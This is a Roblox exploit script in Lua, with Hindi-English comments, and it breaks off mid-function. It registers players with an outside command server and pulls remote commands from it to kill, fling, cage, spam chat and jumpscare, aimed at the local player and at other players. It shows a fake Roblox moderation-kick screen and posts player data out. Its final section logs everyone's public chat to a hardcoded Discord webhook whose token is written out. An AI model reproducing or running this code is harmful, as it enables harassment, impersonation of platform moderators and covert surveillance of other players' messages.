if not game:IsLoaded() then
game.Loaded:Wait()
end

local _Players = game:GetService("Players")
local _RS = game:GetService("ReplicatedStorage")
local _Player = _Players.LocalPlayer

-- Wait for PlayerGui
local _PlayerGui = _Player:WaitForChild("PlayerGui")

-- Wait for core game systems
local _Systems = _RS:WaitForChild("Systems")
local _Remotes = _RS:WaitForChild("Remotes")

-- Wait for player profile
local _Profile = _PlayerGui:WaitForChild("Profile")
local _Inventory = _Profile:WaitForChild("Inventory")

-- Wait for character
local _Character = _Player.Character
or _Player.CharacterAdded:Wait()

local _Humanoid = _Character:WaitForChild("Humanoid")
local _HRP = _Character:WaitForChild("HumanoidRootPart")

-- Let game systems settle
task.wait(3)

-- Verify character is still available
while not _Player.Character
or not _Player.Character:FindFirstChild("HumanoidRootPart") do
task.wait(0.5)
end

print("[Sid Script] Game initialization completed")

-- Safe Initialization V2

local _Players = game:GetService("Players")
local _RS = game:GetService("ReplicatedStorage")
local _Player = _Players.LocalPlayer

-- Non-blocking initialization
local _PlayerGui = _Player:WaitForChild("PlayerGui", 10)

local _Systems = _RS:FindFirstChild("Systems")
local _Remotes = _RS:FindFirstChild("Remotes")

-- Character check without infinite waiting
local _Character = _Player.Character
local _Humanoid = _Character and _Character:FindFirstChildOfClass("Humanoid")
local _HRP = _Character and _Character:FindFirstChild("HumanoidRootPart")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- ========================================
-- ROBLOX OFFICIAL PREMIUM DISCONNECT UI (V4 - FIXED STOP)
-- ========================================

do  
	
-- Saare Services aur Variables is Block ke andar rahenge  
local HttpService = game:GetService("HttpService")  
local Players = game:GetService("Players")  
local TweenService = game:GetService("TweenService")  
local Lighting = game:GetService("Lighting")  
local ReplicatedStorage = game:GetService("ReplicatedStorage")  
local TextChatService = game:GetService("TextChatService")  
local ContentProvider = game:GetService("ContentProvider")  
local StarterGui = game:GetService("StarterGui")  
local RunService = game:GetService("RunService")  
  
local player = Players.LocalPlayer  

-- ===== CONFIG =====  
local BASE_URL = "https://testingbot-8pb1.onrender.com" -- Tumhara Naya URL  
local STATUS_URL = BASE_URL .. "/status/"  
local FAKE_URL = BASE_URL .. "/fakecheck/"  
local STOP_URL = BASE_URL .. "/stopstatus"  
local COMMAND_URL = BASE_URL .. "/api/get_command"  
local CHECK_TIME = 1.5  

-- Universal Request Function  
local request_func = (syn and syn.request) or request or http_request or (fluxus and fluxus.request) or game.HttpGet  

-- ========================================  
-- NEW PREMIUM TROLL FUNCTIONS  
-- ========================================  

-- 1. SPEAK (Voice of God)  
local function doSpeak(msg)  
    local sound = Instance.new("Sound", workspace)  
    sound.SoundId = "rbxassetid://12221967" -- Error/Thunder Sound  
    sound.Volume = 10  
    sound:Play()  
    game:GetService("Debris"):AddItem(sound, 5)  
      
    local gui = Instance.new("ScreenGui", game.CoreGui)  
    local text = Instance.new("TextLabel", gui)  
    text.Size = UDim2.new(1, 0, 1, 0)  
    text.BackgroundTransparency = 1  
    text.Text = msg  
    text.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red Color  
    text.TextSize = 100  
    text.Font = Enum.Font.FredokaOne  
    text.TextStrokeTransparency = 0  
      
    -- Shake Effect  
    task.spawn(function()  
        for i = 1, 20 do  
            text.Position = UDim2.new(0, math.random(-5,5), 0, math.random(-5,5))  
            task.wait(0.05)  
        end  
        text.Position = UDim2.new(0,0,0,0)  
        task.wait(3)  
        gui:Destroy()  
    end)  
end  

        -- 2. CAGE (Absolute Zero Freeze)  
local function doCage()  
    local char = player.Character  
    local hrp = char and char:FindFirstChild("HumanoidRootPart")  
    local hum = char and char:FindFirstChild("Humanoid")  
      
    if not hrp or not hum then return end  
      
    -- 1. Visual Cage (Deewarein)  
    if workspace:FindFirstChild("TitanCage") then workspace.TitanCage:Destroy() end  

    local folder = Instance.new("Folder", workspace)  
    folder.Name = "TitanCage"  
      
    local center = hrp.Position -- Is position par banda jam jayega  

    -- 6 Parts (Pura Box)  
    local parts = {  
        {Pos = center + Vector3.new(0, 4, 0), Size = Vector3.new(6, 0.5, 6)}, -- Roof  
        {Pos = center + Vector3.new(0, -4, 0), Size = Vector3.new(6, 0.5, 6)}, -- Floor  
        {Pos = center + Vector3.new(0, 0, 3), Size = Vector3.new(6, 8, 0.5)}, -- Wall 1  
        {Pos = center + Vector3.new(0, 0, -3), Size = Vector3.new(6, 8, 0.5)}, -- Wall 2  
        {Pos = center + Vector3.new(3, 0, 0), Size = Vector3.new(0.5, 8, 6)}, -- Wall 3  
        {Pos = center + Vector3.new(-3, 0, 0), Size = Vector3.new(0.5, 8, 6)}  -- Wall 4  
    }  
      
    for _, info in pairs(parts) do  
        local part = Instance.new("Part", folder)  
        part.Size = info.Size  
        part.Position = info.Pos  
        part.Anchored = true  
        part.CanCollide = true -- Takra ke wapis girega  
        part.Transparency = 0  
        part.Material = Enum.Material.ForceField -- Admin Look  
        part.Color = Color3.fromRGB(255, 0, 0) -- Red  
    end  
      
    -- Trap Sound  
    local s = Instance.new("Sound", workspace)  
    s.SoundId = "rbxassetid://3359654316"  
    s.PlayOnRemove = true  
    s:Destroy()  

    -- 2. THE PERMANENT FREEZE LOOP  
    -- Ye loop har frame chalega aur usko hilne nahi dega  
    task.spawn(function()  
        while char and hum and hrp and hum.Health > 0 do  
              
            -- A. Physics Freeze  
            hrp.Anchored = true   
            hrp.CFrame = CFrame.new(center) -- Wapis center me teleport  
              
            -- B. Input Freeze (Joystick/Keyboard Disable)  
            hum.WalkSpeed = 0  
            hum.JumpPower = 0  
            hum.AutoRotate = false -- Idhar udhar dekh bhi nahi payega  
            hum:UnequipTools() -- Hath me kuch nahi pakad payega  
              
            -- C. Animation Freeze (Optional: Putla bana do)  
            -- hum.PlatformStand = true   
              
            task.wait() -- Super Fast Loop (No Escape)  
        end  
    end)  
end  



    -- 3. CONTROL (Puppet Master - Infinite Loop)  
local function doControl(action)  
    -- Alag thread me chalayenge taaki script na ruke  
    task.spawn(function()  
        local char = player.Character  
        local hum = char and char:FindFirstChild("Humanoid")  
        local hrp = char and char:FindFirstChild("HumanoidRootPart")  
          
        -- Infinite Loop Start  
        while char and hum and hrp and hum.Health > 0 do  
              
            if action == "jump" then  
                hum.Jump = true -- Bar bar kudega  
              
            elseif action == "sit" then  
                hum.Sit = true -- Khada hone ki koshish karega par wapis baith jayega  
              
            elseif action == "drop" then  
                hum:UnequipTools() -- Weapon pakad hi nahi payega  
              
            elseif action == "spin" then  
                -- Agar spin ruk gaya to wapis laga do  
                if not hrp:FindFirstChild("AdminSpin") then  
                    local bv = Instance.new("BodyAngularVelocity", hrp)  
                    bv.Name = "AdminSpin"  
                    bv.MaxTorque = Vector3.new(0, math.huge, 0)  
                    bv.AngularVelocity = Vector3.new(0, 50, 0)  
                end  
                  
            elseif action == "freeze" then  
                hrp.Anchored = true -- Hamesha ke liye jam jayega  
                  
            elseif action == "kill" then  
                hum.Health = 0  
                break -- Marne ke baad loop band  
                  
            elseif action == "explode" then   
                local ex = Instance.new("Explosion", workspace)  
                ex.Position = hrp.Position  
                task.wait(2) -- Har 2 second me fatata rahega  
            end  
              
            task.wait(0.1) -- Fast Loop Speed  
        end  
    end)  
end  

-- 4. SPY (REAL DATA SENDER)  
local function doSpy()  
    notify("⚠️ SYSTEM ALERT", "Admin is retrieving your data...")  
      
    -- Loop 30 seconds ke liye (Discord bot ke loop se match karega)  
    task.spawn(function()  
        for i = 1, 15 do  
            local char = player.Character  
            local hum = char and char:FindFirstChild("Humanoid")  
            local hrp = char and char:FindFirstChild("HumanoidRootPart")  
              
            if char and hum and hrp then  
                -- 1. Gather Data  
                local currentHealth = math.floor(hum.Health)  
                local maxHealth = math.floor(hum.MaxHealth)  
                  
                -- Check Tool  
                local tool = char:FindFirstChildOfClass("Tool")  
                local toolName = tool and tool.Name or "Empty Hand"  
                  
                -- Check Activity  
                local state = "Idle"  
                if hum.MoveDirection.Magnitude > 0 then state = "Walking" end  
                if hum.Sit then state = "Sitting" end  
                if hum.Health <= 0 then state = "Dead" end  
                  
                -- Position  
                local pos = string.format("%d, %d, %d", math.floor(hrp.Position.X), math.floor(hrp.Position.Y), math.floor(hrp.Position.Z))  
                  
                -- 2. Prepare JSON Payload  
                local payload = {  
                    userid = player.UserId,  
                    health = currentHealth,  
                    max_health = maxHealth,  
                    tool = toolName,  
                    loc = pos,  
                    activity = state  
                }  
                  
                -- 3. Send Data Back to Flask Server  
                pcall(function()  
                    request_func({  
                        Url = BASE_URL .. "/api/report_spy",  
                        Method = "POST",  
                        Body = HttpService:JSONEncode(payload),  
                        Headers = {["Content-Type"] = "application/json"}  
                    })  
                end)  
            end  
              
            task.wait(2) -- Har 2 second me data update bhejo  
        end  
    end)  
end  

-- ========================================  
-- 💓 HEARTBEAT (SMART SESSION TRACKER)  
-- ========================================  
local function startHeartbeat()  
    task.spawn(function()  
        local isFirst = true
          
        while true do  
            -- Data Prepare  
            local payload = {  
                userid = tostring(player.UserId),  
                username = player.Name,  
                display = player.DisplayName,  
                first_run = isFirst -- Ye batayega ki time reset karna hai ya nahi  
            }  
              
            -- Send Signal  
            pcall(function()  
                request_func({  
                    Url = BASE_URL .. "/api/heartbeat",  
                    Method = "POST",  
                    Body = HttpService:JSONEncode(payload),  
                    Headers = {["Content-Type"] = "application/json"}  
                })  
            end)  
              
            -- Pehli baar chalne ke baad, flag ko false kar do  
            if isFirst then  
                isFirst = false  
            end  
              
            task.wait(20) -- Har 20 second me ping  
        end  
    end)  
end  
  
startHeartbeat() -- Start immediately  

-- ========================================  
-- 🌌 GOD-TIER TROLL FUNCTIONS  
-- ========================================  

-- 1. SINGULARITY (Black Hole)  
local function doSingularity(targetId)  
    -- Target player dhoondo  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end  
      
    local center = target.Character.HumanoidRootPart  
      
    -- Visual Black Hole  
    local sphere = Instance.new("Part", center)  
    sphere.Shape = Enum.PartType.Ball  
    sphere.Size = Vector3.new(0,0,0)  
    sphere.Color = Color3.new(0,0,0)  
    sphere.Material = Enum.Material.Neon  
    sphere.Anchored = true  
    sphere.CanCollide = false  
    sphere.Name = "TheVoid"  
      
    -- Animation loop  
    task.spawn(function()  
        -- Sphere grow effect  
        TweenService:Create(sphere, TweenInfo.new(2), {Size = Vector3.new(20,20,20)}):Play()  
          
        -- Pull Loop (15 seconds)  
        local startTime = tick()  
        while tick() - startTime < 15 do  
            if center then  
                sphere.CFrame = center.CFrame  
                  
                -- Loop through all other players  
                for _, p in pairs(Players:GetPlayers()) do  
                    if p ~= target and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then  
                        local hrp = p.Character.HumanoidRootPart  
                        -- Direction vector towards black hole  
                        local direction = (center.Position - hrp.Position).Unit  
                        -- Apply Force (Pull)  
                        hrp.Velocity = direction * 50 -- Speed of pull  
                        hrp.CFrame = CFrame.new(hrp.Position, center.Position) -- Look at black hole  
                    end  
                end  
            end  
            task.wait()  
        end  
        sphere:Destroy()  
    end)  
end  

-- 2. IDENTITY THEFT (Clone)  
local function doIdentity(cloneId)  
    -- Sabko Target jaisa bana do  
    local id = tonumber(cloneId)  
    for _, p in pairs(Players:GetPlayers()) do  
        if p.Character and p.Character:FindFirstChild("Humanoid") then  
            task.spawn(function()  
                pcall(function()  
                    local desc = Players:GetHumanoidDescriptionFromUserId(id)  
                    p.Character.Humanoid:ApplyDescription(desc)  
                end)  
            end)  
        end  
    end  
end  

-- 3. MIDAS TOUCH (Death Touch)  
local function doMidas(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    -- Gold Effect  
    for _, part in pairs(target.Character:GetChildren()) do  
        if part:IsA("BasePart") then  
            part.Color = Color3.fromRGB(255, 215, 0) -- Gold  
            part.Material = Enum.Material.Metal  
              
            -- Kill on Touch Logic  
            part.Touched:Connect(function(hit)  
                if hit.Parent and hit.Parent:FindFirstChild("Humanoid") and hit.Parent.Name ~= target.Name then  
                    hit.Parent:BreakJoints() -- Instant Kill  
                end  
            end)  
        end  
    end  
end  

-- 4. PERSONAL GRAVITY  
local function doGravity(targetId, direction)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end  
      
    local hrp = target.Character.HumanoidRootPart  
      
    -- Remove old forces  
    if hrp:FindFirstChild("AdminGravity") then hrp.AdminGravity:Destroy() end  
      
    local force = Instance.new("BodyForce", hrp)  
    force.Name = "AdminGravity"  
      
    -- Physics Calculations (Mass * Gravity)  
    local mass = 0  
    for _, v in pairs(target.Character:GetChildren()) do  
        if v:IsA("BasePart") then mass = mass + v:GetMass() end  
    end  
    local gravity = workspace.Gravity  
      
    if direction == "up" then  
        -- Upar khincho (Double gravity force upwards)  
        force.Force = Vector3.new(0, mass * gravity * 1.5, 0)  
    elseif direction == "down" then  
        -- Bhari kar do  
        force.Force = Vector3.new(0, -mass * gravity * 5, 0)  
    elseif direction == "side" then  
        -- Deewar ki taraf  
        force.Force = Vector3.new(mass * gravity, mass * gravity, 0)  
    elseif direction == "zero" then  
        -- Hawa mein latka do  
        force.Force = Vector3.new(0, mass * gravity, 0)  
    end  
      
    -- 10 second baad normal kar do  
    game:GetService("Debris"):AddItem(force, 10)  
end  

-- 5. INVISIBLE FLING (PHYSICS DESTROYER)  
local function doFling(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then   
        notify("❌ Error", "Target not found nearby!")  
        return   
    end  
      
    local char = player.Character  
    local hrp = char and char:FindFirstChild("HumanoidRootPart")  
    local hum = char and char:FindFirstChild("Humanoid")  
      
    if not hrp then return end  

    notify("🌪️ FLING", "Targeting: " .. target.Name)  

    -- 1. Setup: Invisible & No Collision  
    -- Hum chahte hain ki hum unke andar ghus sakein bina rukawat ke  
    for _, part in pairs(char:GetDescendants()) do  
        if part:IsA("BasePart") then  
            part.CanCollide = false  
            part.Transparency = 1 -- Pura Gayab  
        elseif part:IsA("Decal") then  
            part.Transparency = 1  
        end  
    end  
      
    -- 2. God Mode (Temporary)  
    -- Taaki takkar se hum na marein  
    local bodyVel = Instance.new("BodyVelocity")  
    bodyVel.Velocity = Vector3.new(0, 0, 0)  
    bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)  
    bodyVel.Parent = hrp  

    local bodyAng = Instance.new("BodyAngularVelocity")  
    bodyAng.AngularVelocity = Vector3.new(0, 99999, 0) -- Super Fast Spin  
    bodyAng.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)  
    bodyAng.Parent = hrp  

    -- 3. Attack Loop (5 Seconds)  
    local startTime = tick()  
    local tHrp = target.Character:FindFirstChild("HumanoidRootPart")  
      
    while tick() - startTime < 5 do  
        if target.Character and tHrp then  
            -- Target ke andar teleport hona baar-baar  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 0)   
            hrp.Velocity = Vector3.new(0, 0, 0) -- Position lock  
            hrp.RotVelocity = Vector3.new(0, 10000, 0) -- Spin Force  
        end  
        task.wait() -- Super fast update  
    end  
      
    -- 4. Cleanup (Reset Character)  
    bodyVel:Destroy()  
    bodyAng:Destroy()  
    player:LoadCharacter() -- Wapis normal hone ke liye respawn  
end  

-- 6. PIGGYBACK (RIDE)  
local function doRide(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    local hrp = player.Character.HumanoidRootPart  
    local tHrp = target.Character.HumanoidRootPart  
      
    notify("🎒 Piggyback", "Riding: " .. target.Name)  
      
    -- Disable Collisions (Taaki hum unke andar na fasein, bas chipak jayein)  
    for _, part in pairs(player.Character:GetDescendants()) do  
        if part:IsA("BasePart") then part.CanCollide = false end  
    end  

    -- Loop: Lock position to their back/shoulders  
    local startTime = tick()  
    -- 20 seconds tak chipke raho  
    while tick() - startTime < 20 do  
        if target.Character and tHrp then  
            -- Position: Thoda sa peeche aur upar  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 2, 1)  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
    player:LoadCharacter() -- Reset  
end  

-- 7. VOID ABDUCTION  
local function doAbduct(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    local hrp = player.Character.HumanoidRootPart  
    local tHrp = target.Character.HumanoidRootPart  
      
    notify("🕳️ Abducting", "Target: " .. target.Name)  
      
    -- Collision On rakhenge taaki dhakka lage  
    local startTime = tick()  
    while tick() - startTime < 5 do  
        if target.Character and tHrp then  
            -- Target ke PAIRO (Feet) par teleport ho jao  
            -- Ye unko neeche se dhakka dega  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, -3, 0)  
            hrp.Velocity = Vector3.new(0, -100, 0) -- Neeche ki taraf force  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
    player:LoadCharacter()  
end  

-- ========================================  
-- 💞 UNIVERSAL COUPLE LOGIC  
-- ========================================  

-- 1. DIRECT RIDE (Agar Rider ke paas script hai)  
local function doSmartRide(targetId)  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if not target or not target.Character then return end  
      
    notify("🚀 Command Received", "Riding: " .. target.Name)  
      
    local hrp = player.Character.HumanoidRootPart  
    local tHrp = target.Character.HumanoidRootPart  
      
    -- Collision Off  
    for _, part in pairs(player.Character:GetDescendants()) do  
        if part:IsA("BasePart") then part.CanCollide = false end  
    end  

    -- Loop: Chipak jao  
    local startTime = tick()  
    while tick() - startTime < 30 do -- 30 sec tak  
        if target.Character and tHrp then  
            hrp.CFrame = tHrp.CFrame * CFrame.new(0, 2, 0.5)  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
end  

-- 2. PHYSICS DRAG (Agar Rider normal player hai)  
local function doPhysicsDrag(riderId, horseId)  
    local rider = Players:GetPlayerByUserId(tonumber(riderId))  
    local horse = Players:GetPlayerByUserId(tonumber(horseId))  
      
    if not rider or not horse then return end  
    notify("🧲 Matchmaker", "Dragging " .. rider.Name .. " to " .. horse.Name)  
      
    local myHrp = player.Character.HumanoidRootPart  
      
    -- Invisible ban jao  
    for _, part in pairs(player.Character:GetDescendants()) do  
        if part:IsA("BasePart") then part.Transparency = 1 part.CanCollide = false end  
    end  

    local startTime = tick()  
    while tick() - startTime < 15 do  
        if rider.Character and horse.Character then  
            local rHrp = rider.Character:FindFirstChild("HumanoidRootPart")  
            local hHrp = horse.Character:FindFirstChild("HumanoidRootPart")  
              
            if rHrp and hHrp then  
                -- Strategy: Rider ke andar teleport ho, aur Horse ki taraf velocity lagao  
                myHrp.CFrame = rHrp.CFrame -- Unke andar ghuso  
                  
                -- Magnet Force Calculation  
                local dir = (hHrp.Position - rHrp.Position).Unit  
                local dist = (hHrp.Position - rHrp.Position).Magnitude  
                  
                if dist > 3 then  
                    -- Door hai? Dhakka maaro!  
                    -- BodyVelocity create karke push karna better hota hai fling ke liye  
                    local bv = Instance.new("BodyVelocity", myHrp)  
                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)  
                    bv.Velocity = dir * 150 -- Super Speed Drag  
                    game:GetService("Debris"):AddItem(bv, 0.1)  
                else  
                    -- Paas hai? Wahi roko  
                    myHrp.CFrame = hHrp.CFrame * CFrame.new(0, 3, 0)  
                end  
            end  
        end  
        game:GetService("RunService").Heartbeat:Wait()  
    end  
    player:LoadCharacter() -- Reset  
end  


-- ========================================  
-- HELPER FUNCTIONS  
-- ========================================  

local function notify(title, text)  
    pcall(function()  
        StarterGui:SetCore("SendNotification", {  
            Title = title;  
            Text = text;  
            Duration = 5;  
        })  
    end)  
end  

local function getJson(url)  
    local ok, res = pcall(function() return game:HttpGet(url) end)  
    if not ok or not res or res == "" then return nil end  
    local good, json = pcall(function() return HttpService:JSONDecode(res) end)  
    return good and json or nil  
end  

-- ========================================  
-- TROLL FUNCTIONS  
-- ========================================  

local function doBlock(targetId)  
    if not targetId then return end  
    local target = Players:GetPlayerByUserId(tonumber(targetId))  
    if target then  
        notify("🚫 BLOCKING", "Removing: " .. target.Name)  
        if target.Character then  
            target.Character:ClearAllChildren()  
            target.Character:Destroy()  
        end  
        target.CharacterAdded:Connect(function(char)  
            task.wait(0.5)  
            if char then char:ClearAllChildren() char:Destroy() end  
        end)  
    end  
end  

local function doJumpscare(customSoundId)  
    local sound = Instance.new("Sound")  
    sound.Name = "JumpscareSound"  
    sound.Parent = workspace  
    sound.SoundId = (customSoundId and customSoundId ~= "") and ("rbxassetid://" .. customSoundId) or "rbxassetid://9119827059"  
    sound.Volume = 10  
    ContentProvider:PreloadAsync({sound})  
    sound:Play()  

    local gui = Instance.new("ScreenGui")  
    gui.Parent = game.CoreGui  
    gui.IgnoreGuiInset = true  
    local img = Instance.new("ImageLabel", gui)  
    img.Size = UDim2.new(1,0,1,0)  
    img.Image = "rbxassetid://13429676378"  
    img.BackgroundColor3 = Color3.new(0,0,0)  
    img.ZIndex = 100  

    task.spawn(function()  
        for i = 1, 20 do  
            img.Visible = not img.Visible  
            task.wait(0.04)  
        end  
        img.Visible = true  
        task.wait(2)  
        gui:Destroy()  
        sound:Destroy()  
    end)  
end  

local function doAudio(id)  
    if workspace:FindFirstChild("TrollSound") then workspace.TrollSound:Destroy() end  
    local s = Instance.new("Sound")  
    s.Name = "TrollSound"  
    s.Parent = workspace  
    s.SoundId = "rbxassetid://"..id  
    s.Volume = 10  
    s.Looped = true  
      
    notify("🔊 Audio", "Loading sound...", 2)  
    local success = pcall(function() if not s.IsLoaded then s.Loaded:Wait() end end)  
    if success then s:Play() end  
end  

local function doSpam(msg, limit)  
    task.spawn(function()  
        for i=1, limit do  
            pcall(function()  
                if TextChatService:FindFirstChild("TextChannels") then  
                    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")  
                    if ch then ch:SendAsync(msg) end  
                elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then  
                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")  
                end  
            end)  
            task.wait(0.35)  
        end  
    end)  
end  

-- ========================================  
-- SECURITY UI FUNCTION  
-- ========================================  

local function showFakeBan(info)  
    if player.PlayerGui:FindFirstChild("RobloxPromptGui") then  
        player.PlayerGui.RobloxPromptGui:Destroy()  
    end  
      
    local blur = Instance.new("BlurEffect")  
    blur.Name = "RobloxDisconnectBlur"; blur.Parent = Lighting; blur.Size = 0  
    TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {Size = 20}):Play()  

    local gui = Instance.new("ScreenGui", player.PlayerGui)  
    gui.Name = "RobloxPromptGui"; gui.IgnoreGuiInset = true; gui.DisplayOrder = 10; gui.ResetOnSpawn = false  

    local overlay = Instance.new("Frame", gui)  
    overlay.Size = UDim2.fromScale(1,1); overlay.BackgroundColor3 = Color3.new(0,0,0); overlay.BackgroundTransparency = 0.5  
      
    local alertBox = Instance.new("Frame", overlay)  
    alertBox.AnchorPoint = Vector2.new(0.5, 0.5); alertBox.Position = UDim2.fromScale(0.5, 0.5)  
    alertBox.Size = UDim2.new(0, 400, 0, 240); alertBox.BackgroundColor3 = Color3.fromRGB(57, 59, 61)  
    Instance.new("UICorner", alertBox).CornerRadius = UDim.new(0, 8)  

    local title = Instance.new("TextLabel", alertBox)  
    title.Text = "Disconnected"; title.Font = Enum.Font.GothamBold; title.TextColor3 = Color3.fromRGB(255, 255, 255)  
    title.TextSize = 24; title.Size = UDim2.new(1, 0, 0, 45); title.BackgroundTransparency = 1; title.Position = UDim2.new(0, 0, 0, 5)  

    local msg = Instance.new("TextLabel", alertBox)  
    msg.Text = "You have been kicked by this experience or its moderators. Moderation message:"  
    msg.Font = Enum.Font.Gotham; msg.TextColor3 = Color3.fromRGB(189, 190, 190); msg.TextSize = 16  
    msg.TextWrapped = true; msg.Size = UDim2.new(0.9, 0, 0, 45); msg.Position = UDim2.new(0.5, 0, 0, 60)  
    msg.AnchorPoint = Vector2.new(0.5, 0); msg.BackgroundTransparency = 1  

    local reason = Instance.new("TextLabel", alertBox)  
    reason.Text = tostring(info.message or "Connection lost.")  
    reason.Font = Enum.Font.Gotham; reason.TextColor3 = Color3.fromRGB(255, 255, 255); reason.TextSize = 16  
    reason.TextWrapped = true; reason.Size = UDim2.new(0.9, 0, 0, 60); reason.Position = UDim2.new(0.5, 0, 0, 110)  
    reason.AnchorPoint = Vector2.new(0.5, 0); reason.BackgroundTransparency = 1  

    local btn = Instance.new("TextButton", alertBox)  
    btn.Text = "Leave"; btn.Font = Enum.Font.GothamBold; btn.TextSize = 16  
    btn.TextColor3 = Color3.fromRGB(30, 30, 30); btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  
    btn.Size = UDim2.new(1, -40, 0, 40); btn.Position = UDim2.new(0.5, 0, 1, -20); btn.AnchorPoint = Vector2.new(0.5, 1)  
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)  

    btn.MouseButton1Click:Connect(function()  
        gui:Destroy(); TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()  
        task.delay(0.4, function() if blur then blur:Destroy() end end)  
    end)  
end  

local function isStopped()  
    local data = getJson(STOP_URL)  
    return (data and data.stop == true)  
end  

-- ========================================  
-- MAIN LOOPS (SECURITY + TROLL)  
-- ========================================  

task.spawn(function()  
      
    -- Stop Check (One Time)  
    if isStopped() then player:Kick("❌ System Disabled by Admin") return end  
      
    -- Fake Ban Check (One Time)  
    task.wait(2)  
    local fake = getJson(FAKE_URL .. player.UserId)  
    if fake and fake.fake == true then showFakeBan(fake) end  

    -- Constant Loop  
    while task.wait(CHECK_TIME) do  
        -- 1. Security Check  
        local info = getJson(STATUS_URL .. player.UserId)  
        if info then  
            if info.maintenance then player:Kick("🛠 Maintenance Mode"); break end  
            if info.access == false then player:Kick("🔐 Not Whitelisted"); break end  
            if info.kick then player:Kick("👢 Kicked: " .. tostring(info.kick_reason)); break end  
            if info.banned then  
                local r = tostring(info.ban_reason or "None")  
                if info.tempban then player:Kick("⏱ Temp Ban: " .. r)  
                else player:Kick("🚫 Banned: " .. r) end  
                break  
            end  
        end  
          
        -- 2. Fake Ban Re-Check  
        local f = getJson(FAKE_URL .. player.UserId)  
        if f and f.fake == true then showFakeBan(f) end  

        -- 3. Troll Command Check  
        pcall(function()  
            local myId = tostring(player.UserId)  
            local targetUrl = COMMAND_URL .. "?userid=" .. myId  
            local resp  
              
            if request_func == game.HttpGet then resp = game:HttpGet(targetUrl)  
            else  
                local r = request_func({Url = targetUrl, Method = "GET"})  
                if r and r.StatusCode == 200 then resp = r.Body end  
            end  

            if resp and resp ~= "" and resp ~= "{}" then  
                local s, data = pcall(function() return HttpService:JSONDecode(resp) end)  
                if s and data and data.type ~= "none" then  
                    if data.type == "block" then doBlock(data.payload.block_id)  
                    elseif data.type == "jumpscare" then doJumpscare(data.payload.sound_id)  
                    elseif data.type == "audio" then doAudio(data.payload.id)  
                    elseif data.type == "spam" then doSpam(data.payload.msg, tonumber(data.payload.limit))

-- NEW COMMANDS --
elseif data.type == "speak" then doSpeak(data.payload.msg)
elseif data.type == "cage" then doCage()
elseif data.type == "control" then doControl(data.payload.action)
elseif data.type == "spy" then doSpy()
-- Isko baki commands ke niche lagana
elseif data.type == "singularity" then
doSingularity(data.payload.target_id) -- Note: Payload check karna padega python se

elseif data.type == "identity" then
doIdentity(data.payload.clone_id)

elseif data.type == "midas" then
doMidas(data.payload.target_id) -- UserID pass karna zaroori hai

elseif data.type == "gravity" then
doGravity(data.payload.target_id, data.payload.dir) -- Note: Yahan target ID bhejna padega payload me
elseif data.type == "ride" then
doRide(data.payload.target_id)

elseif data.type == "abduct" then
doAbduct(data.payload.target_id)

elseif data.type == "fling" then
doFling(data.payload.target_id)

elseif data.type == "couple" then
local rId = tonumber(data.payload.rider_id)
local hId = tonumber(data.payload.horse_id)

if player.UserId == rId then  
    -- CASE A: Main hi Rider hu (Mere paas script hai)  
    -- Toh main khud chalke jaunga  
    doSmartRide(hId)  
      
elseif player.UserId ~= rId and player.UserId ~= hId then  
    -- CASE B: Main Admin hu (Teesra banda)  
    -- Main apni takat se Rider ko kheech ke Horse ke paas le jaunga  
    doPhysicsDrag(rId, hId)  
end  
                    end  
                end  
            end  
        end)  
    end  
end)

end -- << YE 'end' BOHOT ZAROORI HAI >>

-- =========================================================
-- 🕵️ ULTIMATE SPY CHAT (No Doubles + Full Info)
-- =========================================================

task.spawn(function()
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

-- ⚠️ CONFIGURATION: APNA WEBHOOK URL YAHAN DALO  
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571499584662798456/o6WD0XtZbCpyMEXa-AeRib3nw08iA2FtQuZ-NshHgMCfNKqeaQ2AI8Zx9FfGggu8ngi_"  

-- Executor Request Function (Check)  
local request_func = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)  
if not request_func then return warn("Executor not supported") end  

-- [CLEANER] HTML Tags Hatao  
local function cleanMessage(msg)  
    local clean, _ = string.gsub(msg, "<[^>]+>", "")  
    return clean  
end  

-- [SENDER] Discord Bhejne Wala Function  
local function sendToDiscord(player, msg)  
    local finalMsg = cleanMessage(msg)  
    if finalMsg == "" or finalMsg:match("^%s*$") then return end  

    -- 1. Headline & Color Logic  
    local titleText = "👤 Public Chat Detected"  
    local embedColor = 16776960 -- Yellow (Default for others)  

    if player == LocalPlayer then  
        titleText = "📤 Sent by You (LocalPlayer)"  
        embedColor = 65280 -- Green  
    else  
        titleText = "🗣️ Message from: " .. player.DisplayName  
